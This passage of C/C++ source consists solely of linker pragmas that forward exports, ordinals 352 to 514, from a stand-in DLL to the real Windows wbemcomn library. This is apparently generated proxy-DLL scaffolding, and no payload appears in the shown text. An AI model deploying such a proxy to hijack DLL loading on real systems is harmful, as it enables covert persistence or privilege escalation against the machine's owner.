#pragma comment (linker, "/export:??MCWbemTime@@QEBAHAEBV0@@Z=c:/windows/system32/wbemcomn.??MCWbemTime@@QEBAHAEBV0@@Z,@352")
#pragma comment (linker, "/export:??MWString2@@QEBAHPEBG@Z=c:/windows/system32/wbemcomn.??MWString2@@QEBAHPEBG@Z,@353")
#pragma comment (linker, "/export:??MWString@@QEBAHPEBG@Z=c:/windows/system32/wbemcomn.??MWString@@QEBAHPEBG@Z,@354")
#pragma comment (linker, "/export:??NCWbemTime@@QEBAHAEBV0@@Z=c:/windows/system32/wbemcomn.??NCWbemTime@@QEBAHAEBV0@@Z,@355")
#pragma comment (linker, "/export:??NWString2@@QEBAHPEBG@Z=c:/windows/system32/wbemcomn.??NWString2@@QEBAHPEBG@Z,@356")
#pragma comment (linker, "/export:??NWString@@QEBAHPEBG@Z=c:/windows/system32/wbemcomn.??NWString@@QEBAHPEBG@Z,@357")
#pragma comment (linker, "/export:??OCWbemInterval@@QEAAHV0@@Z=c:/windows/system32/wbemcomn.??OCWbemInterval@@QEAAHV0@@Z,@358")
#pragma comment (linker, "/export:??OCWbemTime@@QEBAHAEBV0@@Z=c:/windows/system32/wbemcomn.??OCWbemTime@@QEBAHAEBV0@@Z,@359")
#pragma comment (linker, "/export:??OWString2@@QEBAHPEBG@Z=c:/windows/system32/wbemcomn.??OWString2@@QEBAHPEBG@Z,@360")
#pragma comment (linker, "/export:??OWString@@QEBAHPEBG@Z=c:/windows/system32/wbemcomn.??OWString@@QEBAHPEBG@Z,@361")
#pragma comment (linker, "/export:??PCWbemTime@@QEBAHAEBV0@@Z=c:/windows/system32/wbemcomn.??PCWbemTime@@QEBAHAEBV0@@Z,@362")
#pragma comment (linker, "/export:??PWString2@@QEBAHPEBG@Z=c:/windows/system32/wbemcomn.??PWString2@@QEBAHPEBG@Z,@363")
#pragma comment (linker, "/export:??PWString@@QEBAHPEBG@Z=c:/windows/system32/wbemcomn.??PWString@@QEBAHPEBG@Z,@364")
#pragma comment (linker, "/export:??R?$SZLess@PEBG@@QEBA_NAEBQEBG0@Z=c:/windows/system32/wbemcomn.??R?$SZLess@PEBG@@QEBA_NAEBQEBG0@Z,@365")
#pragma comment (linker, "/export:??RCIdentityTest@@UEAAHPEAVCTimerInstruction@@@Z=c:/windows/system32/wbemcomn.??RCIdentityTest@@UEAAHPEAVCTimerInstruction@@@Z,@366")
#pragma comment (linker, "/export:??RWString2@@QEBA?AV0@HH@Z=c:/windows/system32/wbemcomn.??RWString2@@QEBA?AV0@HH@Z,@367")
#pragma comment (linker, "/export:??RWString@@QEBA?AV0@HH@Z=c:/windows/system32/wbemcomn.??RWString@@QEBA?AV0@HH@Z,@368")
#pragma comment (linker, "/export:??YCWbemInterval@@QEAAXV0@@Z=c:/windows/system32/wbemcomn.??YCWbemInterval@@QEAAXV0@@Z,@369")
#pragma comment (linker, "/export:??YWString2@@QEAAAEAV0@AEBV0@@Z=c:/windows/system32/wbemcomn.??YWString2@@QEAAAEAV0@AEBV0@@Z,@370")
#pragma comment (linker, "/export:??YWString2@@QEAAAEAV0@G@Z=c:/windows/system32/wbemcomn.??YWString2@@QEAAAEAV0@G@Z,@371")
#pragma comment (linker, "/export:??YWString2@@QEAAAEAV0@PEBG@Z=c:/windows/system32/wbemcomn.??YWString2@@QEAAAEAV0@PEBG@Z,@372")
#pragma comment (linker, "/export:??YWString@@QEAAAEAV0@AEBV0@@Z=c:/windows/system32/wbemcomn.??YWString@@QEAAAEAV0@AEBV0@@Z,@373")
#pragma comment (linker, "/export:??YWString@@QEAAAEAV0@G@Z=c:/windows/system32/wbemcomn.??YWString@@QEAAAEAV0@G@Z,@374")
#pragma comment (linker, "/export:??YWString@@QEAAAEAV0@PEBG@Z=c:/windows/system32/wbemcomn.??YWString@@QEAAAEAV0@PEBG@Z,@375")
#pragma comment (linker, "/export:??_7?$SZLess@PEBG@@6B@=c:/windows/system32/wbemcomn.??_7?$SZLess@PEBG@@6B@,@376")
#pragma comment (linker, "/export:??_7C9XAce@@6B@=c:/windows/system32/wbemcomn.??_7C9XAce@@6B@,@377")
#pragma comment (linker, "/export:??_7CAbstractQl1Parser@@6B@=c:/windows/system32/wbemcomn.??_7CAbstractQl1Parser@@6B@,@378")
#pragma comment (linker, "/export:??_7CArena@@6B@=c:/windows/system32/wbemcomn.??_7CArena@@6B@,@379")
#pragma comment (linker, "/export:??_7CBaseAce@@6B@=c:/windows/system32/wbemcomn.??_7CBaseAce@@6B@,@380")
#pragma comment (linker, "/export:??_7CBasicUnloadInstruction@@6B@=c:/windows/system32/wbemcomn.??_7CBasicUnloadInstruction@@6B@,@381")
#pragma comment (linker, "/export:??_7CBuffer@@6B@=c:/windows/system32/wbemcomn.??_7CBuffer@@6B@,@382")
#pragma comment (linker, "/export:??_7CContainerControl@@6B@=c:/windows/system32/wbemcomn.??_7CContainerControl@@6B@,@383")
#pragma comment (linker, "/export:??_7CExecQueue@@6B@=c:/windows/system32/wbemcomn.??_7CExecQueue@@6B@,@384")
#pragma comment (linker, "/export:??_7CExecRequest@@6B@=c:/windows/system32/wbemcomn.??_7CExecRequest@@6B@,@385")
#pragma comment (linker, "/export:??_7CHaltable@@6B@=c:/windows/system32/wbemcomn.??_7CHaltable@@6B@,@386")
#pragma comment (linker, "/export:??_7CIdentityTest@@6B@=c:/windows/system32/wbemcomn.??_7CIdentityTest@@6B@,@387")
#pragma comment (linker, "/export:??_7CInstructionTest@@6B@=c:/windows/system32/wbemcomn.??_7CInstructionTest@@6B@,@388")
#pragma comment (linker, "/export:??_7CLifeControl@@6B@=c:/windows/system32/wbemcomn.??_7CLifeControl@@6B@,@389")
#pragma comment (linker, "/export:??_7CLimitControl@@6B@=c:/windows/system32/wbemcomn.??_7CLimitControl@@6B@,@390")
#pragma comment (linker, "/export:??_7CMinMaxLimitControl@@6B@=c:/windows/system32/wbemcomn.??_7CMinMaxLimitControl@@6B@,@391")
#pragma comment (linker, "/export:??_7CNtAce@@6B@=c:/windows/system32/wbemcomn.??_7CNtAce@@6B@,@392")
#pragma comment (linker, "/export:??_7CQl1ParseSink@@6B@=c:/windows/system32/wbemcomn.??_7CQl1ParseSink@@6B@,@393")
#pragma comment (linker, "/export:??_7CRegistryMinMaxLimitControl@@6B@=c:/windows/system32/wbemcomn.??_7CRegistryMinMaxLimitControl@@6B@,@394")
#pragma comment (linker, "/export:??_7CTimerGenerator@@6B@=c:/windows/system32/wbemcomn.??_7CTimerGenerator@@6B@,@395")
#pragma comment (linker, "/export:??_7CTimerInstruction@@6B@=c:/windows/system32/wbemcomn.??_7CTimerInstruction@@6B@,@396")
#pragma comment (linker, "/export:??_7CUnk@@6B@=c:/windows/system32/wbemcomn.??_7CUnk@@6B@,@397")
#pragma comment (linker, "/export:??_7CUnkInternal@@6B@=c:/windows/system32/wbemcomn.??_7CUnkInternal@@6B@,@398")
#pragma comment (linker, "/export:??_7CWbemCallSecurity@@6B@=c:/windows/system32/wbemcomn.??_7CWbemCallSecurity@@6B@,@399")
#pragma comment (linker, "/export:??_7CWin32DefaultArena@@6B@=c:/windows/system32/wbemcomn.??_7CWin32DefaultArena@@6B@,@400")
#pragma comment (linker, "/export:??_7QL1_Parser@@6B@=c:/windows/system32/wbemcomn.??_7QL1_Parser@@6B@,@401")
#pragma comment (linker, "/export:??_7QL_LEVEL_1_RPN_EXPRESSION@@6B@=c:/windows/system32/wbemcomn.??_7QL_LEVEL_1_RPN_EXPRESSION@@6B@,@402")
#pragma comment (linker, "/export:??_FCBuffer@@QEAAXXZ=c:/windows/system32/wbemcomn.??_FCBuffer@@QEAAXXZ,@403")
#pragma comment (linker, "/export:??_FCEventLog@@QEAAXXZ=c:/windows/system32/wbemcomn.??_FCEventLog@@QEAAXXZ,@404")
#pragma comment (linker, "/export:??_FCFlexArray@@QEAAXXZ=c:/windows/system32/wbemcomn.??_FCFlexArray@@QEAAXXZ,@405")
#pragma comment (linker, "/export:??_FCFlexQueue@@QEAAXXZ=c:/windows/system32/wbemcomn.??_FCFlexQueue@@QEAAXXZ,@406")
#pragma comment (linker, "/export:??_FCNtAcl@@QEAAXXZ=c:/windows/system32/wbemcomn.??_FCNtAcl@@QEAAXXZ,@407")
#pragma comment (linker, "/export:??_FCTextTemplate@@QEAAXXZ=c:/windows/system32/wbemcomn.??_FCTextTemplate@@QEAAXXZ,@408")
#pragma comment (linker, "/export:??_FCUnk@@QEAAXXZ=c:/windows/system32/wbemcomn.??_FCUnk@@QEAAXXZ,@409")
#pragma comment (linker, "/export:??_FCWStringArray@@QEAAXXZ=c:/windows/system32/wbemcomn.??_FCWStringArray@@QEAAXXZ,@410")
#pragma comment (linker, "/export:?AbortCompression@CMRCIControl@@QEAAXXZ=c:/windows/system32/wbemcomn.?AbortCompression@CMRCIControl@@QEAAXXZ,@411")
#pragma comment (linker, "/export:?AbortRequested@CMRCIControl@@QEAAHXZ=c:/windows/system32/wbemcomn.?AbortRequested@CMRCIControl@@QEAAHXZ,@412")
#pragma comment (linker, "/export:?Access@CSafeArray@@QEAAJPEAPEAX@Z=c:/windows/system32/wbemcomn.?Access@CSafeArray@@QEAAJPEAPEAX@Z,@413")
#pragma comment (linker, "/export:?AccessCheck@CIdentitySecurity@@QEAAHXZ=c:/windows/system32/wbemcomn.?AccessCheck@CIdentitySecurity@@QEAAHXZ,@414")
#pragma comment (linker, "/export:?AccessRawArray@CVarVector@@QEAAJPEAPEAX@Z=c:/windows/system32/wbemcomn.?AccessRawArray@CVarVector@@QEAAJPEAPEAX@Z,@415")
#pragma comment (linker, "/export:?Add@CFlexArray@@QEAAHPEAX@Z=c:/windows/system32/wbemcomn.?Add@CFlexArray@@QEAAHPEAX@Z,@416")
#pragma comment (linker, "/export:?Add@CMinMaxLimitControl@@UEAAJKKPEAK@Z=c:/windows/system32/wbemcomn.?Add@CMinMaxLimitControl@@UEAAJKKPEAK@Z,@417")
#pragma comment (linker, "/export:?Add@CVarVector@@QEAAHAEAVCVar@@@Z=c:/windows/system32/wbemcomn.?Add@CVarVector@@QEAAHAEAVCVar@@@Z,@418")
#pragma comment (linker, "/export:?Add@CVarVector@@QEAAHPEAVCVar@@@Z=c:/windows/system32/wbemcomn.?Add@CVarVector@@QEAAHPEAVCVar@@@Z,@419")
#pragma comment (linker, "/export:?Add@CWStringArray@@QEAAHPEBG@Z=c:/windows/system32/wbemcomn.?Add@CWStringArray@@QEAAHPEBG@Z,@420")
#pragma comment (linker, "/export:?AddAce@CNtAcl@@QEAAHPEAVCNtAce@@@Z=c:/windows/system32/wbemcomn.?AddAce@CNtAcl@@QEAAHPEAVCNtAce@@@Z,@421")
#pragma comment (linker, "/export:?AddAggregationProperty@QL_LEVEL_1_RPN_EXPRESSION@@UEAAXAEBVCPropertyName@@@Z=c:/windows/system32/wbemcomn.?AddAggregationProperty@QL_LEVEL_1_RPN_EXPRESSION@@UEAAXAEBVCPropertyName@@@Z,@422")
#pragma comment (linker, "/export:?AddAllAggregationProperties@QL_LEVEL_1_RPN_EXPRESSION@@UEAAXXZ=c:/windows/system32/wbemcomn.?AddAllAggregationProperties@QL_LEVEL_1_RPN_EXPRESSION@@UEAAXXZ,@423")
#pragma comment (linker, "/export:?AddAllProperties@QL_LEVEL_1_RPN_EXPRESSION@@UEAAXXZ=c:/windows/system32/wbemcomn.?AddAllProperties@QL_LEVEL_1_RPN_EXPRESSION@@UEAAXXZ,@424")
#pragma comment (linker, "/export:?AddAppropriateToken@CAbstractQl1Parser@@IEAAXAEBU_tag_WbemQl1Token@@@Z=c:/windows/system32/wbemcomn.?AddAppropriateToken@CAbstractQl1Parser@@IEAAXAEBU_tag_WbemQl1Token@@@Z,@425")
#pragma comment (linker, "/export:?AddBSTR@CSafeArray@@QEAAHPEAG@Z=c:/windows/system32/wbemcomn.?AddBSTR@CSafeArray@@QEAAHPEAG@Z,@426")
#pragma comment (linker, "/export:?AddBool@CSafeArray@@QEAAHF@Z=c:/windows/system32/wbemcomn.?AddBool@CSafeArray@@QEAAHF@Z,@427")
#pragma comment (linker, "/export:?AddByte@CSafeArray@@QEAAHE@Z=c:/windows/system32/wbemcomn.?AddByte@CSafeArray@@QEAAHE@Z,@428")
#pragma comment (linker, "/export:?AddChild@CClientOpsNode@@QEAAXPEAV1@@Z=c:/windows/system32/wbemcomn.?AddChild@CClientOpsNode@@QEAAXPEAV1@@Z,@429")
#pragma comment (linker, "/export:?AddCulture@CMUILocaleList@@AEAAJPEBGW4LocaleType@CMUILocale@@K@Z=c:/windows/system32/wbemcomn.?AddCulture@CMUILocaleList@@AEAAJPEBGW4LocaleType@CMUILocale@@K@Z,@430")
#pragma comment (linker, "/export:?AddDispatch@CSafeArray@@QEAAHPEAUIDispatch@@@Z=c:/windows/system32/wbemcomn.?AddDispatch@CSafeArray@@QEAAHPEAUIDispatch@@@Z,@431")
#pragma comment (linker, "/export:?AddDouble@CSafeArray@@QEAAHN@Z=c:/windows/system32/wbemcomn.?AddDouble@CSafeArray@@QEAAHN@Z,@432")
#pragma comment (linker, "/export:?AddElement@CPropertyName@@QEAAXPEBG@Z=c:/windows/system32/wbemcomn.?AddElement@CPropertyName@@QEAAXPEBG@Z,@433")
#pragma comment (linker, "/export:?AddEnvironmentValue@CWbemInstallObject@@SAJPEBG0@Z=c:/windows/system32/wbemcomn.?AddEnvironmentValue@CWbemInstallObject@@SAJPEBG0@Z,@434")
#pragma comment (linker, "/export:?AddFloat@CSafeArray@@QEAAHM@Z=c:/windows/system32/wbemcomn.?AddFloat@CSafeArray@@QEAAHM@Z,@435")
#pragma comment (linker, "/export:?AddHavingToken@QL_LEVEL_1_RPN_EXPRESSION@@UEAAXAEBU_tag_WbemQl1Token@@@Z=c:/windows/system32/wbemcomn.?AddHavingToken@QL_LEVEL_1_RPN_EXPRESSION@@UEAAXAEBU_tag_WbemQl1Token@@@Z,@436")
#pragma comment (linker, "/export:?AddInsertionString@CEventLogRecord@@IEAAXAEAVCInsertionString@@@Z=c:/windows/system32/wbemcomn.?AddInsertionString@CEventLogRecord@@IEAAXAEAVCInsertionString@@@Z,@437")
#pragma comment (linker, "/export:?AddLocale@CMUILocaleList@@AEAAJPEBGW4LocaleType@CMUILocale@@K@Z=c:/windows/system32/wbemcomn.?AddLocale@CMUILocaleList@@AEAAJPEBGW4LocaleType@CMUILocale@@K@Z,@438")
#pragma comment (linker, "/export:?AddLong@CSafeArray@@QEAAHJ@Z=c:/windows/system32/wbemcomn.?AddLong@CSafeArray@@QEAAHJ@Z,@439")
#pragma comment (linker, "/export:?AddMember@CLimitControl@@UEAAJXZ=c:/windows/system32/wbemcomn.?AddMember@CLimitControl@@UEAAJXZ,@440")
#pragma comment (linker, "/export:?AddProperty@QL_LEVEL_1_RPN_EXPRESSION@@UEAAXAEBVCPropertyName@@@Z=c:/windows/system32/wbemcomn.?AddProperty@QL_LEVEL_1_RPN_EXPRESSION@@UEAAXAEBVCPropertyName@@@Z,@441")
#pragma comment (linker, "/export:?AddRecord@CEventLog@@IEAAHPEAVCEventLogRecord@@@Z=c:/windows/system32/wbemcomn.?AddRecord@CEventLog@@IEAAHPEAVCEventLogRecord@@@Z,@442")
#pragma comment (linker, "/export:?AddRef@CBasicUnloadInstruction@@UEAAXXZ=c:/windows/system32/wbemcomn.?AddRef@CBasicUnloadInstruction@@UEAAXXZ,@443")
#pragma comment (linker, "/export:?AddRef@CBuffer@@UEAAKXZ=c:/windows/system32/wbemcomn.?AddRef@CBuffer@@UEAAKXZ,@444")
#pragma comment (linker, "/export:?AddRef@CContainerControl@@UEAAXPEAUIUnknown@@@Z=c:/windows/system32/wbemcomn.?AddRef@CContainerControl@@UEAAXPEAUIUnknown@@@Z,@445")
#pragma comment (linker, "/export:?AddRef@CExecQueue@@QEAAXXZ=c:/windows/system32/wbemcomn.?AddRef@CExecQueue@@QEAAXXZ,@446")
#pragma comment (linker, "/export:?AddRef@CUnk@@UEAAKXZ=c:/windows/system32/wbemcomn.?AddRef@CUnk@@UEAAKXZ,@447")
#pragma comment (linker, "/export:?AddRef@CUnkInternal@@UEAAKXZ=c:/windows/system32/wbemcomn.?AddRef@CUnkInternal@@UEAAKXZ,@448")
#pragma comment (linker, "/export:?AddRef@CWbemCallSecurity@@UEAAKXZ=c:/windows/system32/wbemcomn.?AddRef@CWbemCallSecurity@@UEAAKXZ,@449")
#pragma comment (linker, "/export:?AddRef@QL_LEVEL_1_RPN_EXPRESSION@@QEAAXXZ=c:/windows/system32/wbemcomn.?AddRef@QL_LEVEL_1_RPN_EXPRESSION@@QEAAXXZ,@450")
#pragma comment (linker, "/export:?AddScalar@CSafeArray@@AEAAHTSA_ArrayScalar@@@Z=c:/windows/system32/wbemcomn.?AddScalar@CSafeArray@@AEAAHTSA_ArrayScalar@@@Z,@451")
#pragma comment (linker, "/export:?AddShort@CSafeArray@@QEAAHF@Z=c:/windows/system32/wbemcomn.?AddShort@CSafeArray@@QEAAHF@Z,@452")
#pragma comment (linker, "/export:?AddToken@QL_LEVEL_1_RPN_EXPRESSION@@QEAAXAEBUQL_LEVEL_1_TOKEN@@@Z=c:/windows/system32/wbemcomn.?AddToken@QL_LEVEL_1_RPN_EXPRESSION@@QEAAXAEBUQL_LEVEL_1_TOKEN@@@Z,@453")
#pragma comment (linker, "/export:?AddToken@QL_LEVEL_1_RPN_EXPRESSION@@UEAAXAEBU_tag_WbemQl1Token@@@Z=c:/windows/system32/wbemcomn.?AddToken@QL_LEVEL_1_RPN_EXPRESSION@@UEAAXAEBU_tag_WbemQl1Token@@@Z,@454")
#pragma comment (linker, "/export:?AddUnknown@CSafeArray@@QEAAHPEAUIUnknown@@@Z=c:/windows/system32/wbemcomn.?AddUnknown@CSafeArray@@QEAAHPEAUIUnknown@@@Z,@455")
#pragma comment (linker, "/export:?AddVariant@CSafeArray@@QEAAHPEAUtagVARIANT@@@Z=c:/windows/system32/wbemcomn.?AddVariant@CSafeArray@@QEAAHPEAUtagVARIANT@@@Z,@456")
#pragma comment (linker, "/export:?AdjustInitialPriority@CExecQueue@@MEAAXPEAVCExecRequest@@@Z=c:/windows/system32/wbemcomn.?AdjustInitialPriority@CExecQueue@@MEAAXPEAVCExecRequest@@@Z,@457")
#pragma comment (linker, "/export:?AdjustPriorityForPassing@CExecQueue@@MEAAXPEAVCExecRequest@@@Z=c:/windows/system32/wbemcomn.?AdjustPriorityForPassing@CExecQueue@@MEAAXPEAVCExecRequest@@@Z,@458")
#pragma comment (linker, "/export:?AdjustPrivIfLocalSystem@@YAXPEAX@Z=c:/windows/system32/wbemcomn.?AdjustPrivIfLocalSystem@@YAXPEAX@Z,@459")
#pragma comment (linker, "/export:?Advance@CBuffer@@QEAAJK@Z=c:/windows/system32/wbemcomn.?Advance@CBuffer@@QEAAJK@Z,@460")
#pragma comment (linker, "/export:?AliasToTable@CWQLScanner@@QEAAQEAGPEAG@Z=c:/windows/system32/wbemcomn.?AliasToTable@CWQLScanner@@QEAAQEAGPEAG@Z,@461")
#pragma comment (linker, "/export:?Alloc@CWin32DefaultArena@@UEAAPEAX_K@Z=c:/windows/system32/wbemcomn.?Alloc@CWin32DefaultArena@@UEAAPEAX_K@Z,@462")
#pragma comment (linker, "/export:?AllocAmPm@CDateTimeParser@@IEAAPEAGXZ=c:/windows/system32/wbemcomn.?AllocAmPm@CDateTimeParser@@IEAAPEAGXZ,@463")
#pragma comment (linker, "/export:?AppendBuffer@WString2@@AEAAXPEBG_K@Z=c:/windows/system32/wbemcomn.?AppendBuffer@WString2@@AEAAXPEBG_K@Z,@464")
#pragma comment (linker, "/export:?AppendCulture@CMUILocaleList@@AEAAJPEBG@Z=c:/windows/system32/wbemcomn.?AppendCulture@CMUILocaleList@@AEAAJPEBG@Z,@465")
#pragma comment (linker, "/export:?AppendLocale@CMUILocaleList@@AEAAJPEBG@Z=c:/windows/system32/wbemcomn.?AppendLocale@CMUILocaleList@@AEAAJPEBG@Z,@466")
#pragma comment (linker, "/export:?Apply@CTextTemplate@@QEAAPEAGPEAUIWbemClassObject@@@Z=c:/windows/system32/wbemcomn.?Apply@CTextTemplate@@QEAAPEAGPEAUIWbemClassObject@@@Z,@467")
#pragma comment (linker, "/export:?Bind@CFlexArray@@QEAAXAEAV1@@Z=c:/windows/system32/wbemcomn.?Bind@CFlexArray@@QEAAXAEAV1@@Z,@468")
#pragma comment (linker, "/export:?BindPtr@WString2@@QEAAXPEAG@Z=c:/windows/system32/wbemcomn.?BindPtr@WString2@@QEAAXPEAG@Z,@469")
#pragma comment (linker, "/export:?BindPtr@WString@@QEAAXPEAG@Z=c:/windows/system32/wbemcomn.?BindPtr@WString@@QEAAXPEAG@Z,@470")
#pragma comment (linker, "/export:?BlobAssign@@YAXPEAUtagBLOB@@PEAXKH@Z=c:/windows/system32/wbemcomn.?BlobAssign@@YAXPEAUtagBLOB@@PEAXKH@Z,@471")
#pragma comment (linker, "/export:?BlobClear@@YAXPEAUtagBLOB@@@Z=c:/windows/system32/wbemcomn.?BlobClear@@YAXPEAUtagBLOB@@@Z,@472")
#pragma comment (linker, "/export:?BlobCopy@@YA?AUtagBLOB@@PEBU1@@Z=c:/windows/system32/wbemcomn.?BlobCopy@@YA?AUtagBLOB@@PEBU1@@Z,@473")
#pragma comment (linker, "/export:?BreakOnDbgAndRenterLoop@@YAKXZ=c:/windows/system32/wbemcomn.?BreakOnDbgAndRenterLoop@@YAKXZ,@474")
#pragma comment (linker, "/export:?BreakWait@CInstructionQueue@@QEAAXXZ=c:/windows/system32/wbemcomn.?BreakWait@CInstructionQueue@@QEAAXXZ,@475")
#pragma comment (linker, "/export:?BuildOperationInfo@@YAJPEBG000PEAPEAG@Z=c:/windows/system32/wbemcomn.?BuildOperationInfo@@YAJPEBG000PEAPEAG@Z,@476")
#pragma comment (linker, "/export:?BuildSWQLColRef@CWQLScanner@@AEAAHAEAVCFlexArray@@AEAUSWQLColRef@@@Z=c:/windows/system32/wbemcomn.?BuildSWQLColRef@CWQLScanner@@AEAAHAEAVCFlexArray@@AEAUSWQLColRef@@@Z,@477")
#pragma comment (linker, "/export:?BuildSecurityDescriptorParameter@@YAJPEAUIWbemServices@@PEAUIWbemContext@@PEAVCNtSecurityDescriptor@@PEAUIWbemClassObject@@@Z=c:/windows/system32/wbemcomn.?BuildSecurityDescriptorParameter@@YAJPEAUIWbemServices@@PEAUIWbemContext@@PEAVCNtSecurityDescriptor@@PEAUIWbemClassObject@@@Z,@478")
#pragma comment (linker, "/export:?CalcSitOutPenalty@CExecQueue@@MEAAKJ@Z=c:/windows/system32/wbemcomn.?CalcSitOutPenalty@CExecQueue@@MEAAKJ@Z,@479")
#pragma comment (linker, "/export:?CanDelete@CVar@@QEAAHXZ=c:/windows/system32/wbemcomn.?CanDelete@CVar@@QEAAHXZ,@480")
#pragma comment (linker, "/export:?CaptureStackTrace@CMemoryLog@@AEAAXQEAPEAX@Z=c:/windows/system32/wbemcomn.?CaptureStackTrace@CMemoryLog@@AEAAXQEAPEAX@Z,@481")
#pragma comment (linker, "/export:?Change@CInstructionQueue@@QEAAJPEAVCTimerInstruction@@VCWbemTime@@@Z=c:/windows/system32/wbemcomn.?Change@CInstructionQueue@@QEAAJPEAVCTimerInstruction@@VCWbemTime@@@Z,@482")
#pragma comment (linker, "/export:?ChangeTypeTo@CVar@@QEAAHG@Z=c:/windows/system32/wbemcomn.?ChangeTypeTo@CVar@@QEAAHG@Z,@483")
#pragma comment (linker, "/export:?ChangeTypeToEx@CVar@@QEAAHGK@Z=c:/windows/system32/wbemcomn.?ChangeTypeToEx@CVar@@QEAAHGK@Z,@484")
#pragma comment (linker, "/export:?ChangeVariantToCIMTYPE@@YAJPEAUtagVARIANT@@0J@Z=c:/windows/system32/wbemcomn.?ChangeVariantToCIMTYPE@@YAJPEAUtagVARIANT@@0J@Z,@485")
#pragma comment (linker, "/export:?CheckDMTFDateTimeFormat@CDateTimeParser@@SAHPEBGHH@Z=c:/windows/system32/wbemcomn.?CheckDMTFDateTimeFormat@CDateTimeParser@@SAHPEBGHH@Z,@486")
#pragma comment (linker, "/export:?CheckDMTFDateTimeFormatInternal@CDateTimeParser@@IEAAHPEBG@Z=c:/windows/system32/wbemcomn.?CheckDMTFDateTimeFormatInternal@CDateTimeParser@@IEAAHPEBG@Z,@487")
#pragma comment (linker, "/export:?CheckDMTFDateTimeInterval@CDateTimeParser@@SAHPEBG@Z=c:/windows/system32/wbemcomn.?CheckDMTFDateTimeInterval@CDateTimeParser@@SAHPEBG@Z,@488")
#pragma comment (linker, "/export:?CheckDateFormat@CDateTimeParser@@IEAAHPEBGH@Z=c:/windows/system32/wbemcomn.?CheckDateFormat@CDateTimeParser@@IEAAHPEBGH@Z,@489")
#pragma comment (linker, "/export:?CheckLangNeutral@CMUILocale@@SAJPEBGPEA_N@Z=c:/windows/system32/wbemcomn.?CheckLangNeutral@CMUILocale@@SAJPEBGPEA_N@Z,@490")
#pragma comment (linker, "/export:?CheckTimeFormat@CDateTimeParser@@IEAAHPEBGH@Z=c:/windows/system32/wbemcomn.?CheckTimeFormat@CDateTimeParser@@IEAAHPEBGH@Z,@491")
#pragma comment (linker, "/export:?CheckType@CSafeArray@@AEAAXH@Z=c:/windows/system32/wbemcomn.?CheckType@CSafeArray@@AEAAXH@Z,@492")
#pragma comment (linker, "/export:?CleanUp@CWbemInstallObject@@SAXXZ=c:/windows/system32/wbemcomn.?CleanUp@CWbemInstallObject@@SAXXZ,@493")
#pragma comment (linker, "/export:?ClearPropRefs@CWQLScanner@@AEAAXXZ=c:/windows/system32/wbemcomn.?ClearPropRefs@CWQLScanner@@AEAAXXZ,@494")
#pragma comment (linker, "/export:?ClearTableRefs@CWQLScanner@@AEAAXXZ=c:/windows/system32/wbemcomn.?ClearTableRefs@CWQLScanner@@AEAAXXZ,@495")
#pragma comment (linker, "/export:?ClearTokens@CWQLScanner@@AEAAXXZ=c:/windows/system32/wbemcomn.?ClearTokens@CWQLScanner@@AEAAXXZ,@496")
#pragma comment (linker, "/export:?Clone@CBuffer@@UEAAJPEAPEAUIStream@@@Z=c:/windows/system32/wbemcomn.?Clone@CBuffer@@UEAAJPEAPEAUIStream@@@Z,@497")
#pragma comment (linker, "/export:?CloneData@CSmallArrayBlob@@QEAAPEAPEAXXZ=c:/windows/system32/wbemcomn.?CloneData@CSmallArrayBlob@@QEAAPEAPEAXXZ,@498")
#pragma comment (linker, "/export:?CloneThreadContext@CWbemCallSecurity@@UEAAJH@Z=c:/windows/system32/wbemcomn.?CloneThreadContext@CWbemCallSecurity@@UEAAJH@Z,@499")
#pragma comment (linker, "/export:?CloneThreadToken@CWbemCallSecurity@@AEAAJK@Z=c:/windows/system32/wbemcomn.?CloneThreadToken@CWbemCallSecurity@@AEAAJK@Z,@500")
#pragma comment (linker, "/export:?Close@CEventLog@@QEAAHXZ=c:/windows/system32/wbemcomn.?Close@CEventLog@@QEAAHXZ,@501")
#pragma comment (linker, "/export:?CoCreateInstance@CWbemInstallObject@@SAJAEBU_GUID@@PEAUIUnknown@@K0PEAPEAX@Z=c:/windows/system32/wbemcomn.?CoCreateInstance@CWbemInstallObject@@SAJAEBU_GUID@@PEAUIUnknown@@K0PEAPEAX@Z,@502")
#pragma comment (linker, "/export:?CoGetClassObject@CWbemInstallObject@@SAJAEBU_GUID@@KPEAU_COSERVERINFO@@0PEAPEAX@Z=c:/windows/system32/wbemcomn.?CoGetClassObject@CWbemInstallObject@@SAJAEBU_GUID@@KPEAU_COSERVERINFO@@0PEAPEAX@Z,@503")
#pragma comment (linker, "/export:?Commit@CBuffer@@UEAAJK@Z=c:/windows/system32/wbemcomn.?Commit@CBuffer@@UEAAJK@Z,@504")
#pragma comment (linker, "/export:?CompareEls@CFlexArray@@KAHPEBX0@Z=c:/windows/system32/wbemcomn.?CompareEls@CFlexArray@@KAHPEBX0@Z,@505")
#pragma comment (linker, "/export:?CompareEls@CSmallArrayBlob@@KAHPEBX0@Z=c:/windows/system32/wbemcomn.?CompareEls@CSmallArrayBlob@@KAHPEBX0@Z,@506")
#pragma comment (linker, "/export:?CompareTo@CVar@@QEAAHAEAV1@H@Z=c:/windows/system32/wbemcomn.?CompareTo@CVar@@QEAAHAEAV1@H@Z,@507")
#pragma comment (linker, "/export:?CompareTo@CVarVector@@QEAAHAEAV1@H@Z=c:/windows/system32/wbemcomn.?CompareTo@CVarVector@@QEAAHAEAV1@H@Z,@508")
#pragma comment (linker, "/export:?ComposeName@@YAJPEAGPEAPEAG@Z=c:/windows/system32/wbemcomn.?ComposeName@@YAJPEAGPEAPEAG@Z,@509")
#pragma comment (linker, "/export:?Compress@CFlexArray@@QEAAXXZ=c:/windows/system32/wbemcomn.?Compress@CFlexArray@@QEAAXXZ,@510")
#pragma comment (linker, "/export:?Compress@CWStringArray@@QEAAXXZ=c:/windows/system32/wbemcomn.?Compress@CWStringArray@@QEAAXXZ,@511")
#pragma comment (linker, "/export:?CompressBuffer@CMRCICompression@@QEAAIPEAEK0KW4CompressionLevel@1@@Z=c:/windows/system32/wbemcomn.?CompressBuffer@CMRCICompression@@QEAAIPEAEK0KW4CompressionLevel@1@@Z,@512")
#pragma comment (linker, "/export:?CompressFile@CMRCICompression@@QEAAHPEBG0KW4CompressionLevel@1@PEAVCMRCIControl@@@Z=c:/windows/system32/wbemcomn.?CompressFile@CMRCICompression@@QEAAHPEBG0KW4CompressionLevel@1@PEAVCMRCIControl@@@Z,@513")
#pragma comment (linker, "/export:?CompressFileV1@CMRCICompression@@IEAAHHHKW4CompressionLevel@1@PEAVCMRCIControl@@@Z=c:/windows/system32/wbemcomn.?CompressFileV1@CMRCICompression@@IEAAHHHKW4CompressionLevel@1@PEAVCMRCIControl@@@Z,@514")
